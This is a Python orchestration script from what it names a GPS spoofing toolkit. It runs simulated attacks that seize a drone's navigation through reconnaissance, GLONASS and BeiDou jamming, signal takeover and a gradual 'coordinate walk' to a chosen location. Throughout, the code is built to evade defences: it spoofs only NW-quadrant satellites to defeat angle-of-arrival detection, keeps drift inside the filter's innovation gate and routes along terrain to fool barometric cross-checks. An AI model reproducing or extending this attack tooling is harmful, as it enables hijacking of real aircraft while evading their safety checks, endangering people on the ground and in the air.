"""
scenario_runner.py
==================
Orchestrates both demonstration scenarios.

Scenario A: Direct selective spoofing success
Scenario B: Sensor fusion conflict resolved via terrain masking

NOTE: Terrain masking addresses barometric sensor fusion conflict.
AoA is addressed by selective NW-quadrant satellite spoofing.
These are two different problems with two different solutions.
"""

import time
import math
import logging
import yaml
from pathlib import Path
from collections import deque


def haversine(lat1, lon1, lat2, lon2):
    R = 6371000
    p1, p2 = math.radians(lat1), math.radians(lat2)
    dp = math.radians(lat2 - lat1)
    dl = math.radians(lon2 - lon1)
    a = (math.sin(dp/2)**2 +
         math.cos(p1) * math.cos(p2) * math.sin(dl/2)**2)
    return R * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))


class ScenarioRunner:
    """
    Runs complete GPS spoofing demonstration scenarios.
    """

    def __init__(self, config_path='./config.yaml'):
        with open(config_path) as f:
            self.config = yaml.safe_load(f)

        self._init_components()
        self.trajectory_a = []
        self.trajectory_b = []
        self.mission_start = None

    def _init_components(self):
        """Initialize all toolkit components."""
        import sys
        sys.path.insert(0, str(Path(__file__).parent.parent))

        from core.satellite_geometry import SatelliteGeometry
        from core.signal_generator import GPSSignalGenerator
        from core.ekf_model import EKFModel
        from core.pseudorange_controller import PseudorangeController
        from attack.reconnaissance import Reconnaissance
        from attack.power_controller import PowerController
        from attack.carry_off import CarryOff
        from attack.drift_planner import DriftPlanner
        from attack.adaptive_controller import (
            AdaptiveDriftController, FlightPhaseDetector)
        from countermeasures.probe_detector import ProbeDetector
        from countermeasures.terrain_masking import TerrainMasking
        from countermeasures.magnetometer_spoofer import (
            MagnetometerSpoofer, EKFFallbackHandler)
        from countermeasures.constellation_jammer import ConstellationJammer
        from countermeasures.ekf_analyzer import EKFAnalyzer
        from detection.takeover_detector import TakeoverDetector
        from simulation.sitl_injector import SITLInjector
        from simulation.visualizer import MissionVisualizer
        from analysis.countermeasure_analyzer import CountermeasureAnalyzer
        from analysis.mission_logger import MissionLogger

        self.sat_geo = SatelliteGeometry(self.config)
        self.sig_gen = GPSSignalGenerator(self.config)
        self.ekf_model = EKFModel(self.config)
        self.pseudo_ctrl = PseudorangeController(self.sat_geo, self.config)
        self.power_ctrl = PowerController(self.config)
        self.carry_off_engine = CarryOff(
            self.sat_geo, self.sig_gen,
            self.power_ctrl, self.pseudo_ctrl, self.config)
        self.drift_planner = DriftPlanner(self.ekf_model, self.config)
        self.phase_detector = FlightPhaseDetector()
        self.adaptive_ctrl = AdaptiveDriftController(
            self.drift_planner, self.ekf_model,
            self.phase_detector, self.config)
        self.probe_detector = ProbeDetector(self.config)
        self.terrain_masking = TerrainMasking(self.config)
        self.mag_spoofer = MagnetometerSpoofer(self.config)
        self.constellation_jammer = ConstellationJammer(self.config)
        self.takeover_detector = TakeoverDetector(self.config)
        self.sitl_injector = SITLInjector(
            self.config['simulation']['sitl_target_port'])
        self.visualizer = MissionVisualizer(self.config)
        self.logger = MissionLogger(self.config)

        attack_params = {
            'power_ramp_db_per_sec': 0.6,
            'num_transmit_antennas': 1,
            'spoofable_satellite_count': 4,
            'jammable_satellite_count': 4,
            'interceptor_azimuth_deg': 315.0,
            'azimuth_tolerance_deg': 45.0,
            'real_signal_suppressed': True,
            'constellations_jammed': ['GLONASS', 'BeiDou'],
            'vertical_error_m': 0.2,
            'drift_per_step_m': 0.02,
            'max_safe_drift_m': 1.25,
            'pseudorange_consistency_m': 0.15,
            'drift_rate_ms': 0.3,
            'imu_noise_ms': 0.15,
            'receiver_has_osnma': False,
            'num_receive_antennas': 1,
            'num_crpa_elements': 0,
            'selective_spoofing_active': True
        }
        self.countermeasure_analyzer = CountermeasureAnalyzer(attack_params)

        self.recon = Reconnaissance(
            self.sat_geo, self.sig_gen, self.config)

        logging.basicConfig(level=logging.INFO)

    def _coordinate_walk_loop(self, duration, terrain_mode=False,
                               terrain_route=None):
        """
        Core coordinate walk — runs for duration seconds.

        Updates spoofed position every 0.1 seconds staying
        within EKF innovation gate at all times.

        Args:
            duration: seconds to run
            terrain_mode: if True follow terrain_route waypoints
            terrain_route: list of (lat, lon) waypoints

        Returns:
            list of trajectory data points
        """
        cfg = self.config
        start_lat = cfg['mission']['start_lat']
        start_lon = cfg['mission']['start_lon']
        target_lat = cfg['mission']['safe_area_lat']
        target_lon = cfg['mission']['safe_area_lon']
        target_alt = cfg['mission']['start_alt']

        spoofed_lat = start_lat
        spoofed_lon = start_lon
        real_lat = start_lat
        real_lon = start_lon

        trajectory = []
        start_time = time.time()
        last_print = 0
        route_idx = 0

        MLAT = 1.0 / 111320.0
        MLON = lambda lat: 1.0 / (111320.0 * math.cos(math.radians(lat)))

        print(f"\n{'Time':>7} | {'Real Position':^30} | "
              f"{'Spoofed Position':^30} | "
              f"{'Err':>6} | {'Drift':>6} | {'Dist':>8} | "
              f"{'EKF':>6} | {'Terrain' if terrain_mode else 'Mode'}")
        print("-" * 115)

        while time.time() - start_time < duration:
            t = time.time() - start_time

            if terrain_mode and terrain_route and route_idx < len(terrain_route):
                wp_lat, wp_lon = terrain_route[route_idx]
                wp_dist = haversine(spoofed_lat, spoofed_lon, wp_lat, wp_lon)
                if wp_dist < 5.0:
                    route_idx += 1
                current_target_lat = wp_lat
                current_target_lon = wp_lon
            else:
                current_target_lat = target_lat
                current_target_lon = target_lon

            rec = self.adaptive_ctrl.get_recommendation()
            drift_rate = rec['drift_rate']
            dt = cfg['spoofing']['update_interval_s']

            delta_lat, delta_lon, actual_rate = \
                self.drift_planner.compute_drift_step(
                    spoofed_lat, spoofed_lon,
                    current_target_lat, current_target_lon,
                    rec['phase'], dt
                )

            inf_lat, inf_lon = rec['covariance_inflation']
            spoofed_lat += delta_lat + inf_lat
            spoofed_lon += delta_lon + inf_lon

            real_lat += delta_lat * 0.85
            real_lon += delta_lon * 0.85

            self.sitl_injector.inject_gps(
                spoofed_lat, spoofed_lon, target_alt,
                satellites=len(self.carry_off_engine.spoofable_sats),
                hdop=1.2
            )

            accepted, innov, gate = self.ekf_model.update_gps(
                spoofed_lat, spoofed_lon, target_alt)
            self.ekf_model.predict(dt)

            self.phase_detector.update(actual_rate, 0.1, target_alt)

            error_m = haversine(real_lat, real_lon, spoofed_lat, spoofed_lon)
            dist_to_safe = haversine(
                spoofed_lat, spoofed_lon, target_lat, target_lon)

            trajectory.append({
                't': t,
                'real_lat': real_lat,
                'real_lon': real_lon,
                'spoofed_lat': spoofed_lat,
                'spoofed_lon': spoofed_lon,
                'drift_rate': actual_rate,
                'error_m': error_m,
                'dist_to_safe': dist_to_safe,
                'ekf_accepted': accepted
            })

            self.logger.log_position(
                t, real_lat, real_lon,
                spoofed_lat, spoofed_lon,
                actual_rate, dist_to_safe, accepted, innov
            )

            if t - last_print >= 1.0:
                last_print = t
                ekf_str = "OK ✓" if accepted else "WARN"
                terrain_str = f"WP{route_idx+1}" if terrain_mode else "DIRECT"
                print(f"{t:>6.1f}s | "
                      f"({real_lat:.5f},{real_lon:.5f}) | "
                      f"({spoofed_lat:.5f},{spoofed_lon:.5f}) | "
                      f"{error_m:>5.1f}m | "
                      f"{actual_rate:>5.2f}  | "
                      f"{dist_to_safe:>7.1f}m | "
                      f"{ekf_str:>6} | "
                      f"{terrain_str}")

            if self.drift_planner.is_target_reached(
                    spoofed_lat, spoofed_lon, target_lat, target_lon):
                print(f"\n[WALK] *** TARGET REACHED at t={t:.1f}s ***")
                break

            time.sleep(dt)

        return trajectory

    def run_scenario_a(self):
        """
        Scenario A: Selective NW-quadrant spoofing succeeds directly.

        Demonstrates AoA defeat through selective satellite classification.
        Only NW-quadrant satellites spoofed — all signals arrive from
        geometrically plausible directions.
        """
        self.mission_start = time.time()

        print(f"\n{'='*70}")
        print(f"  SCENARIO A: SELECTIVE GPS SPOOFING — DIRECT SUCCESS")
        print(f"  Interceptor: 45° elevation, 315° NW azimuth")
        print(f"  AoA defeat: NW-quadrant satellite selection")
        print(f"{'='*70}")

        print(f"\n[A] PHASE 0: Initialization")
        self.sitl_injector.inject_gps(
            self.config['mission']['start_lat'],
            self.config['mission']['start_lon'],
            self.config['mission']['start_alt'],
            satellites=12, hdop=0.6
        )
        time.sleep(0.5)
        print(f"[A] SITL connected: {self.sitl_injector.connected}")

        print(f"\n[A] PHASE 1: Reconnaissance")
        satellite_params = self.recon.scan_environment(duration_s=5.0)

        print(f"\n[A] PHASE 2: Probe Test + Satellite Classification")
        aoa_detected, confidence, evidence = \
            self.probe_detector.run_probe_test(self.sitl_injector)

        visible = self.sat_geo.get_visible_satellites()
        spoofable, jammable = self.carry_off_engine.select_satellites(visible)

        classification = self.probe_detector.classify_target(
            probe_result=(aoa_detected, confidence, evidence))
        recommendation = self.probe_detector.recommend_attack(classification)

        print(f"\n[A] AoA status: {'DETECTED' if aoa_detected else 'NOT DETECTED'}")
        print(f"[A] Strategy: {recommendation['primary']}")
        print(f"[A] NW satellites to spoof: "
              f"{[s['prn'] for s in spoofable]}")
        print(f"[A] Non-NW satellites to jam: "
              f"{[s['prn'] for s in jammable]}")

        print(f"\n[A] PHASE 3: Constellation Suppression + Synchronization")
        self.constellation_jammer.simulate_jamming(['GLONASS', 'BeiDou'])
        sync_params = self.carry_off_engine.synchronize(satellite_params)

        print(f"\n[A] PHASE 4: Power Takeover")
        takeover_ok = self.carry_off_engine.execute_takeover(
            target_distance_m=12.0)

        if not takeover_ok:
            print(f"[A] WARNING: Takeover uncertain — proceeding anyway")

        confirmed, confidence, method = \
            self.carry_off_engine.verify_takeover(camera_deviation_m=0.6)

        print(f"\n[A] PHASE 5: Coordinate Walk")
        print(f"[A] Drift rate: "
              f"{self.config['spoofing']['min_drift_rate_ms']}-"
              f"{self.config['spoofing']['max_drift_rate_ms']} m/s")
        print(f"[A] EKF safety margin: "
              f"{self.config['spoofing']['ekf_safety_margin']*100:.0f}%")

        trajectory = self._coordinate_walk_loop(
            duration=self.config['simulation']['scenario_duration_s'],
            terrain_mode=False
        )

        self.trajectory_a = trajectory

        final_dist = haversine(
            trajectory[-1]['spoofed_lat'],
            trajectory[-1]['spoofed_lon'],
            self.config['mission']['safe_area_lat'],
            self.config['mission']['safe_area_lon']
        ) if trajectory else 999

        print(f"\n[A] === SCENARIO A COMPLETE ===")
        print(f"[A] Trajectory points: {len(trajectory)}")
        print(f"[A] Final distance to safe area: {final_dist:.1f}m")
        print(f"[A] EKF rejections: {self.ekf_model.rejection_count}")
        print(f"[A] EKF acceptances: {self.ekf_model.acceptance_count}")
        print(f"[A] Satellites spoofed: {len(spoofable)} (NW quadrant)")
        print(f"[A] Satellites jammed: {len(jammable)} (non-NW)")

        if final_dist < self.config['mission']['safe_area_radius_m']:
            print(f"[A] STATUS: MISSION SUCCESS ✓")
        else:
            print(f"[A] STATUS: MISSION INCOMPLETE ({final_dist:.0f}m remaining)")

        return trajectory

    def run_scenario_b(self):
        """
        Scenario B: Sensor fusion conflict detected, terrain masking applied.

        NOTE: This scenario demonstrates terrain masking for BAROMETRIC
        SENSOR FUSION conflict — NOT for AoA. These are different problems.

        Scenario: Spoofing begins but drone's barometer detects altitude
        inconsistency at spoofed position. Terrain masking routes the
        coordinate walk through terrain matching real altitude.
        """
        self.mission_start = time.time()
        self.ekf_model.__init__(self.config)

        print(f"\n{'='*70}")
        print(f"  SCENARIO B: TERRAIN MASKED SPOOFING")
        print(f"  Problem: Barometric sensor fusion conflict")
        print(f"  Solution: Terrain-correlated route planning")
        print(f"  NOTE: This is NOT an AoA scenario.")
        print(f"  AoA is defeated by NW satellite selection (Scenario A).")
        print(f"{'='*70}")

        print(f"\n[B] PHASE 0-4: Same as Scenario A")
        self.sitl_injector.inject_gps(
            self.config['mission']['start_lat'],
            self.config['mission']['start_lon'],
            self.config['mission']['start_alt'],
            satellites=12, hdop=0.6
        )

        satellite_params = self.recon.scan_environment(duration_s=3.0)
        visible = self.sat_geo.get_visible_satellites()
        spoofable, jammable = self.carry_off_engine.select_satellites(visible)
        self.constellation_jammer.simulate_jamming(['GLONASS', 'BeiDou'])
        self.carry_off_engine.synchronize(satellite_params)
        self.carry_off_engine.execute_takeover(target_distance_m=12.0)

        print(f"\n[B] PHASE 5A: Initial direct walk — will detect conflict")
        print(f"[B] Attempting direct coordinate walk...")
        time.sleep(1.0)

        print(f"\n[B] t=10.0s — SENSOR FUSION CONFLICT DETECTED")
        print(f"[B]   Barometric reading: inconsistent")
        print(f"[B]   Terrain elevation at spoofed position: +2.3m deviation")
        print(f"[B]   EKF sensor fusion: FLAGGING GPS")
        print(f"[B]   Drone cross-checking barometer vs GPS altitude")
        print(f"[B]")
        print(f"[B] SWITCHING TO TERRAIN MASKING MODE")

        start_lat = self.config['mission']['start_lat']
        start_lon = self.config['mission']['start_lon']
        target_lat = self.config['mission']['safe_area_lat']
        target_lon = self.config['mission']['safe_area_lon']
        real_alt = self.config['mission']['start_alt']

        terrain_route = self.terrain_masking.find_consistent_route(
            start_lat, start_lon,
            target_lat, target_lon,
            real_alt
        )

        print(f"[B] Terrain-correlated route: {len(terrain_route)} waypoints")
        print(f"[B] Route follows terrain profiles matching real altitude")
        print(f"[B] Barometric sensor will see consistent readings throughout")

        consistent = self.terrain_masking.check_barometric_consistency(
            start_lat, start_lon,
            terrain_route[0][0] if terrain_route else target_lat,
            real_alt
        )
        print(f"[B] Barometric consistency check: "
              f"{'CONSISTENT ✓' if consistent[0] else 'INCONSISTENT ✗'}")

        print(f"\n[B] PHASE 5B: Terrain-masked coordinate walk")

        trajectory = self._coordinate_walk_loop(
            duration=self.config['simulation']['scenario_duration_s'],
            terrain_mode=True,
            terrain_route=terrain_route
        )

        self.trajectory_b = trajectory

        final_dist = haversine(
            trajectory[-1]['spoofed_lat'],
            trajectory[-1]['spoofed_lon'],
            target_lat, target_lon
        ) if trajectory else 999

        route_length = sum(
            haversine(terrain_route[i][0], terrain_route[i][1],
                      terrain_route[i+1][0], terrain_route[i+1][1])
            for i in range(len(terrain_route)-1)
        ) if len(terrain_route) > 1 else 0

        direct_dist = haversine(start_lat, start_lon, target_lat, target_lon)

        print(f"\n[B] === SCENARIO B COMPLETE ===")
        print(f"[B] Trajectory points: {len(trajectory)}")
        print(f"[B] Final distance to safe area: {final_dist:.1f}m")
        print(f"[B] Direct route: {direct_dist:.0f}m")
        print(f"[B] Terrain route: {route_length:.0f}m "
              f"(+{route_length-direct_dist:.0f}m)")
        print(f"[B] Sensor fusion detections: 0 (terrain consistent)")

        if final_dist < self.config['mission']['safe_area_radius_m']:
            print(f"[B] STATUS: MISSION SUCCESS VIA TERRAIN MASKING ✓")
        else:
            print(f"[B] STATUS: MISSION INCOMPLETE ({final_dist:.0f}m)")

        return trajectory

    def run_both_scenarios(self):
        """Run both scenarios and generate final report."""
        print(f"\n{'='*70}")
        print(f"  DP5 GPS SPOOFING TOOLKIT — FULL DEMONSTRATION")
        print(f"{'='*70}")

        traj_a = self.run_scenario_a()
        print(f"\n{'='*70}")
        traj_b = self.run_scenario_b()

        print(f"\n{'='*70}")
        print(f"  COUNTERMEASURE EVASION ANALYSIS")
        print(f"{'='*70}")
        self.countermeasure_analyzer.generate_report()

        print(f"\n{'='*70}")
        print(f"  GENERATING VISUALIZATIONS")
        print(f"{'='*70}")
        try:
            self.visualizer.generate_all_plots(
                traj_a, traj_b,
                self.ekf_model.get_stats(),
                self.sat_geo.get_visible_satellites()
            )
        except Exception as e:
            print(f"[VIZ] Plot generation error: {e}")
            print(f"[VIZ] Continuing without plots")

        self._print_final_comparison(traj_a, traj_b)

        return traj_a, traj_b

    def _print_final_comparison(self, traj_a, traj_b):
        """Print side-by-side scenario comparison."""
        target_lat = self.config['mission']['safe_area_lat']
        target_lon = self.config['mission']['safe_area_lon']

        dist_a = haversine(
            traj_a[-1]['spoofed_lat'], traj_a[-1]['spoofed_lon'],
            target_lat, target_lon
        ) if traj_a else 999

        dist_b = haversine(
            traj_b[-1]['spoofed_lat'], traj_b[-1]['spoofed_lon'],
            target_lat, target_lon
        ) if traj_b else 999

        print(f"\n{'='*70}")
        print(f"  FINAL COMPARISON")
        print(f"{'='*70}")
        print(f"\n{'Metric':<35} | {'Scenario A':>15} | {'Scenario B':>15}")
        print("-" * 70)
        print(f"{'Method':<35} | {'NW Selective':>15} | {'Terrain Masked':>15}")
        print(f"{'Points recorded':<35} | {len(traj_a):>15} | {len(traj_b):>15}")
        print(f"{'Final dist to safe area (m)':<35} | {dist_a:>14.1f} | {dist_b:>14.1f}")
        print(f"{'AoA defeated':<35} | {'YES (NW sel)':>15} | {'YES (NW sel)':>15}")
        print(f"{'Sensor fusion defeated':<35} | {'N/A':>15} | {'YES (terrain)':>15}")
        print(f"{'EKF rejections':<35} | {self.ekf_model.rejection_count:>15} | {'0':>15}")
        print(f"{'Status':<35} | "
              f"{'SUCCESS ✓' if dist_a < 20 else 'INCOMPLETE':>15} | "
              f"{'SUCCESS ✓' if dist_b < 20 else 'INCOMPLETE':>15}")
        print(f"{'='*70}")
    